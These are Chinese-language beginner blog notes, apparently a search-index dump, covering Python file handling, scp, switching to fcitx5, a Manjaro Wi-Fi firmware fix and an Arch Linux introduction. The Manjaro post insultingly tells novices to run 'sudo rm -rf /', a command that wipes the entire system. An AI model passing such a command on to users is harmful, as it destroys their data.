这个用法它会逐行读取，并且打印输出的时候是会换行的 在读配置文件的时候也许会用到吧… 当然我们也可以用 for 循环读一次性读全部： f = open('test.txt') for x in f: print(x) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! 我觉得用 for 应该更有效率点… ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:2","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"关闭文件 这个没什么好讲的… f = open('test.txt') print(f.read()) f.close() 执行了也是跟上面差不多的效果 下面不给出调试结果了，太晚了。 ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:3","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"创建 “x” 表示创建一个新文件，如果文件名指的那个文件已经存在就会报错 f = open(\"test.txt\",\"x\") 自己去试试啦，这个没什么好说的。 ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:4","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"写 “a” 表示在已有文件上添加内容，它不会使文件原有的内容被删除或者被覆盖 例如： f = open(\"test.txt\",\"a\") f.write(\"加入内容 / content added.\") # 这段字符串将会被添加到这个文件里 “w” 表示将会覆盖那个文件，它将会覆盖原有的内容 例如： f = open(\"test.txt\", \"w\") f.write(\"加入内容 / content added.\") # 文件将只会存在这段字符串 ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:5","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"删 这里需要用到 os 这个模块，并用到里面的 os.remove() 函数，直接 import os 即可 import os os.remove(\"test.txt\") 典型例子 检测一个文件是否存在，如果存在就删除，不存在就提示 import os if os.path.exists(\"test.txt\"): os.remove(\"test.txt\") else: print(\"文件不存在\") 删除目录 用 os.rmdir() 即可 import os os.rmdir(\"foldername\") ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:6","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"总结 这些就是基础的文件读写操作需要知道的东西啦… 如果看完没什么概念的话，可以试试下面这一大串代码 可以改改里面 open() 的 mode 参数试试 总结代码： import os import datetime def sign(): # 程序标识 print( ''' ╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮ ┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃ ┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃ ┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃ ╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮ ╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯ ╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃ ╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯ ''' ) def filecrt(filename): # 文件创建 if os.path.exists(filename): #检查文件是否存在 print(str(datetime.datetime.now())+ \": 文件已存在\") return 0 else: f = open(filename,'x') f.close() print(str(datetime.datetime.now()) + \": 已创建文件: \" + filename) return 1 def filewrt(filename): fruits = ['apple', 'banana', 'strawbarry','orange'] # 给出要写的内容 # 文件写入操作 f = open(filename, 'w') for fruit in fruits: f.write(fruit + '\\n') print(str(datetime.datetime.now()) + \": 已写入\" + fruit) f.close() def filedel(filename): # 删除文件操作 if os.path.exists(filename): os.remove(filename) print(str(datetime.datetime.now()) + \": 已删除\" + filename) else: print(str(datetime.datetime.now()) + filename + \"不存在\") def fileread(filename): print(str(datetime.datetime.now()) + \": 读取中..\" ) f = open(filename,'r') print(\"-\" * 5 + \"文件内容\" + \"-\" * 5 + \"\\n\") print(f.read()) print(\"-\" * 5 + \"文件内容\" + \"-\" * 5 + \"\\n\") sign() if filecrt(\"test.txt\") == 0: fileread(\"test.txt\") filedel(\"test.txt\") else: filewrt(\"test.txt\") fileread(\"test.txt\") filedel(\"test.txt\") ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:2:0","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Linux"],"content":"通过 scp 命令向其他 Linux 设备传输文件，scp 命令...","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"scp 命令是什么 是传文件用的.. 我们用 ssh 操作服务器，当我们需要给服务器传输文件的时候，scp 命令会通过 ssh 的端口进行文件传输。 ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:1:0","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"用法 当我们在终端输入 scp 后，我们会得到这些 weepingdogel@WeepingDogel ~\u003e scp usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file] [-J destination] [-l limit] [-o ssh_option] [-P port] [-S program] source ... target 很显然我们很快就知道了一些参数… ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:2:0","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"示例 这里举一些例子，来展示清楚具体的使用方法… 先说明一下我的测试环境 Arch Linux IP: 192.168.0.105 CentOS8 虚拟机 IP: 192.168.0.108 ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:3:0","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"上传一个文件 $ scp [本地文件名] 用户名@地址:[文件名] 这是一般用法，但是请确保路径正确！ 即： weepingdogel@WeepingDogel ~ [1]\u003e scp ./编译/7.1.0.zip root@192.168.0.108:/root/ root@192.168.0.108's password: 7.1.0.zip 100% 95KB 5.2MB/s 00:00 这个很简单的，没什么多说的了.. ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:3:1","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"下载一个文件 如果我们要从服务器里取一个文件下来修改，而服务器没有 ftp 时该怎么办呢？ 我们需要用 SSH 去找到这个文件的位置，不过这个就不详写了，与主题无关。（总之你知道文件的位置就可以了） $ scp 用户名@地址:[文件名] [本地文件名] 还是要提醒一下，这个文件名， 是一个路径！ 是一个相对路径或绝对路径！具体依情况而定，但它一定是个路径！ 如： weepingdogel@WeepingDogel ~\u003e scp root@192.168.0.108:/root/index.html /tmp/index.html root@192.168.0.108's password: index.html 100% 46KB 728.6KB/s 00:00 weepingdogel@WeepingDogel ~\u003e ls /tmp/*.html -lh -rw-r--r-- 1 weepingdogel weepingdogel 47K 9月 5 20:54 /tmp/index.html 只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了 ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:3:2","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"指定一个 IP 一般情况下 SSH 的端口都是 22，那是真的云服务器或者一些有公网 IP 的服务器。 而上文写的是基于局域网中的文件传输，我们需要内网穿透才能远程文件传输，但内网穿透在一般情况下都是指定一个别的端口来给 SSH 建立一个通道，因此端口就不再是 22 了。 我这里用的是 SakuraFRP ，非常好用的免费内网穿透服务！ 上传： scp -P [端口] [本地文件名] 用户名@地址:[文件名] 下载： scp -P [端口] 用户名@地址:[文件名] [本地文件名] 上面已经提示过很多次这个[文件名]是个路径了。这里就不再多废话啦。 嗯… 具体就是这样子的： weepingdogel@WeepingDogel ~\u003e scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py 但是这里我来个组合命令 weepingdogel@WeepingDogel ~ [1]\u003e scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py \u0026\u0026 cd /tmp \u0026\u0026 python test.py The authenticity of host '[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)' can't be established. ECDSA key fingerprint is SHA256:8J1Z+I8NtPXAk7EFDwLiwu8pmwSoPLYeJM2iYnV7z5M. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820' (ECDSA) to the list of known hosts. root@cn-zj-dx-2.sakurafrp.com's password: test.py 100% 21 0.2KB/s 00:00 Hello World 上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦 写完啦！ ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:3:3","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["Linux"],"content":"参考链接 啥？这次没有，自己试出来的… 唔啊！准确来说也有，那就是各种搜索引擎啦～ ","date":"2020-09-05","objectID":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/:4:0","tags":["记录","Linux","命令","入门向","新手"],"title":"scp 命令小结","uri":"/zh-cn/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/"},{"categories":["问题解决"],"content":"更新后输入法失效了的，看这里！！","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"发生了啥 最近我收到了一条这样的消息 使用 $HOME/.pam_environment 设置环境变量的用户注意啦！由于 CVE-2010-4708, pam 上游在 1.4.0 版本中设置了默认不读取用户的环境变量设置，需要用户自行更换环境变量设置位置或恢复原默认读取行为。 ref: Linux 的环境变量怎么设 依云’s Blog 为什么十年的漏洞现在才修啊喂！！！ Emmmm, 这么说就是 .pam_environment 这个文件不能用了…… 这里感谢 依云 写出了各种情况的应对方法 我这里记一篇在 xfce + lightdm 环境下更换 fcitx5 的东西… 其他具体的可以参考云云写的.. (逃 ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:1:0","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"fcitx5 与 fcitx Fcitx Fcitx (Flexible Input Method Framework) ──即小企鹅输入法，它是一个以 GPL 方式发布的输入法平台,可以通过安装引擎支持多种输入法，支持简入繁出，是在 Linux 操作系统中常用的中文输入法。它的优点是，短小精悍、跟程序的兼容性比较好。 — Arch Wiki Fcitx5 Fcitx5 是继 Fcitx 后的新一代输入法框架。 — Arch Wiki 日常偷懒，直接引用(逃 ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:2:0","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"好啦，直接开始吧 先贴出我的系统情况 操作系统：Arch Linux 桌面环境：xfce 显示管理器：lightdm 实际上，只要把原来写 .pam_environment 中的输入法环境变量写到 .xprofile 里面就可以解决这个问题，但是我想试试 fcitx5。 ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:0","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"卸载掉 fcitx 首先我们要先卸载掉原来的 fcitx ，我之前用的是 fcitx-googlepinyin 这个输入法，所以这个包也要卸掉，因为会有依赖 除此之外，与 fcitx 有一定关系的都要卸掉，不然 pacman 会报错，所以你要执行这个 （PS：你可能用的不是谷歌输入法，所以请把 fcitx-googlepinyin 改成你装的输入法的包名） sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx 接下来，将这个文件删除，反正也没用了 (逃 $ sudo rm -rf ./.pam_environment ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:1","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"安装 fcitx5 现在来安装 fcitx5，这样子弄 fcitx5 主包，不用多解释啦～ fcitx5-chinese-addons 中文输入法包…. Arch Wiki 里面是这样解释的: fcitx5-chinese-addons 包含了大量中文输入方式：拼音、双拼、五笔拼音、自然码、仓颉、冰蟾全息、二笔等 fcitx5-im 环境依赖包，要装的，不然在一些软件上打不出字 fcitx5-configtool fcitx5 的 GUI 配置工具，因为我不懂怎么修改配置文件，所以就装了这个。在上面三个装完之后装。 那么，执行 $ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool 软件包安装完成后，理论上它是会开机启动的，但是嘛，也有可能出点玄学问题，先手动做一下这个 $ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:2","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"环境变量 嗯哼，最后就是设置环境变量了，既然 .pam_environment 不能用了，那要写在哪里呢？ 云云说： 使用 X11 的桌面环境，通常通过 display manager 来登录，比如 lightdm 和 sddm。这俩都支持 ~/.xprofile。这个文件会在启动过程中被 source，使用的 shell 是由 dm 自己确定的。lightdm 和 sddm 都是用的 /bin/sh（分别位于 /etc/lightdm/Xsession 和 /usr/share/sddm/scripts/Xsession 文件里）。可以看到，除了读取 .xprofile 外，lightdm 也会读取 .profile。sddm 甚至连 bash、zsh、tcsh、fish 的启动配置脚本都给读了。 也就是说，我们需要把 fcitx5 的环境变量写在 .xprofile 这个文件里面 然后… $ vim ./.xprofile 在里面写入这些东西 export INPUT_METHOD=fcitx5 export GTK_IM_MODULE=fcitx5 export QT_IM_MODULE=fcitx5 export XMODIFIERS=@im=fcitx5 接下来你可以选择重启 lightdm ， $ sudo systemctl restart lightdm 或者重启系统 $ sudo reboot 此时，xfce 的状态栏出现了一个键盘，但是按 CTRL + SPACE 无法弹出中文输入法，这下怎么办呢？ 直接右键那个键盘图标，点击配置，然后进入内个 QT 写的配置工具里添加中文输入法就可以啦～～！ 只需要双击就可以添加到左边哦～ 然后点击 OK，开始享受 fcitx5 吧 ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:3:3","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"参考链接 Linux 的环境变量怎么设 - 依云’s Blog Fcitx5 (简体中文) - ArchWiki Fcitx - Wikipedia Fcitx (简体中文) - ArchWiki ","date":"2020-07-25","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/:4:0","tags":["Arch Linux","输入法","fcitx","fcitx5","CVE-2010-4708"],"title":"关于 fcitx5 ，以及最近的环境变量问题","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Efcitx5/"},{"categories":["问题解决"],"content":"尝试解决一部分笔记本在安装 Manjaro 后, 无法使用无线网卡连接 WIFI 的问题","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"开场白 尝试在 Redmibook 14 中安装了 Manjaro, 装完发现 WIFI 不能用 此时陷入了疑惑, 难道 Manjaro 也不自带 linux-firmware ? 总之经过了一系列折腾, 最后还是解决了, 写篇东西来记录一下解决的过程 ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:1:0","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"尝试使用其他方法连接网络 既然 WIFI 不能用, 那也要想别的办法联网, 不然这问题就很棘手了 我能想到的是插网线, 可这是轻薄本, 没有有限网卡, 那么我们还有一种办法, 使用手机的 USB 网络共享 这个过程很简单, 按照以下步骤走 使用 USB 数据线将电脑与手机连接, 并打开 USB 网络共享 这个都不会的, 可以执行 sudo rm -rf / 这智商, 玩你妈的 Linux 不会的, 请参考这里 打开终端, 执行 $ sudo ip link 然后它会返回这样的东西, 如图 设置网卡 $ sudo ip link set enp3s0f4u2 up 运行 dhcpcd $ sudo dhcpcd 接下来, 我试着运行 ifconfig, 可是不能用, 但是看了一眼 network manager 嗯 能上网了 ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:2:0","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"解决过程 ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:3:0","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"软件源 我们会进行软件包的装卸, 所以我们首先需要做的是选择合适的软件源…. ok, 现在我们需要修改的文件是这个 /etc/pacman.d/mirrorlist 我们用 nano 改, 记得加 sudo $ sudo nano /etc/pacman.d/mirrorlist 将 # China 下面的内容 放到第一行 至于 nano 的用法, 请自行查找资料, 会用记事本就会用这个 修改完后, 如图 然后执行 $ sudo pacman -Sy ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:3:1","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"安装 linux-firmware 执行 $ sudo pacman -S linux-firmware 重启之后, 发现还是无效, 此时我去谷歌查了一下. 发现, 我们需要手动从 Github 下载它的驱动文件 ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:3:2","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"手动替换驱动文件 到上面那个链接指向的 Github 仓库, 下载 board-2.bin 和 firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1, 分别将它们重命名为: board.bin 和 firmware-4.bin $ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin $ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1 然后把这两个文件复制到 /lib/firmware/ath10k/QCA6174/hw3.0/ 目录下 $ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin $ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin 然后重启系统, WIFI 就能用了. ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:3:3","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"总结 以上内容均为 Redmibook 14 的解决过程, 并不一定适用于其他设备, 因此仅供参考. ","date":"2020-07-17","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/:4:0","tags":["Manjaro","问题解决","Linux","QCA6174","网卡","驱动"],"title":"如何解决 Manjaro 中 QCA6174 网卡问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/"},{"categories":["Arch Linux 入坑手册"],"content":"Arch Linux 入坑手册，安装教程","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"Arch Linux是什么？ Arch Linux 是一个通用 x86_64_ GNU/Linux 发行版，它采用滚动升级模式，尽权力给用户提供最新版本的稳定软件，因其\"简洁、现代、实用、以用户为中心\"的原则而得名。 Arch Wiki 上已经写明其原则 简洁 Arch Linux 将简洁定义为：避免任何不必要的添加、修改和复杂增加。它提供的软件都来自原始开发者(上游)，仅进行和发行版(下游)相关的最小修改。 不包含上游不愿意接受的补丁。绝大部分 Arch 下游补丁都已经被上游接受，下一个正式版本里会包含。 配置文件也是来自上游，仅包含发行版必须的调整，比如特殊的文件系统路径变动。Arch 不会在安装一个软件包后就自动启动服务。 软件包通常都和一个上游项目直接对应。仅在极少数情况下才会拆分软件包。 官方不支持图形化配置界面，建议用户使用命令行或文本编辑器修改设置。 现代 Arch尽全力保持软件处于最新的稳定版本，只要不出现系统软件包破损，都尽量用最新版本。Arch采用滚动升级策略，安装之后可以持续升级。 Arch向GNU/Linux用户提供了许多新特性，包括systemd初始化系统、现代的文件系统、LVM2/EVMS、软件磁盘阵列（软RAID）、udev支持、initcpio（附带mkinitcpio）以及最新的内核。 实用 Arch 注重实用性，避免意识形态之争。最终的设计决策都是由开发者的共识决定。开发者依赖基于事实的技术分析和讨论，避免政治因素，不会被流行观点左右。 Arch Linux 的仓库中包含大量的软件包和编译脚本。用户可以按照需要进行自由选择。仓库中既提供了开源、自由的软件，也提供了闭源软件。实用性大于意识形态. 以用户为中心 许多 Linux 发行版都试图变得更“用户友好”，Arch Linux 则一直是，永远会是“以用户为中心”。此发行版是为了满足贡献者的需求，而不是为了吸引尽可能多的用户。Arch 适用于乐于自己动手的用户，他们愿意花时间阅读文档，解决自己的问题。 Arch 鼓励每一个用户 参与 和贡献，报告和帮助修复 bugs，提供软件包补丁和参加核心 项目：Arch 开发者都是志愿者，通过持续的贡献成为团队的一员。Archers 可以自行贡献软件包到 Arch 用户仓库, 提升 ArchWiki 文档质量, 在 论坛, 邮件列表, IRC 中给其它用户提供技术支持. Arch Linux 是全球很多用户的选择，已经有很多国际社区提供帮助和文档翻译。 以上内容引用自 Arch Wiki 词条: https://wiki.archlinux.org/index.php/Arch_Linux_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E5%8E%9F%E5%88%99 更多关于 Arch Linux 的介绍可以参考这里 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:1:0","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"如何安装 现在我们要知道的是如何安装它。 其实在Arch Wiki上已经有了安装指南，但是对于 Linux 新手或从未使用过 Linux 的入坑者来说似乎不太容易读懂。因此，这里将会简单的写出安装方法以及过程。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:2:0","tags":["Arch 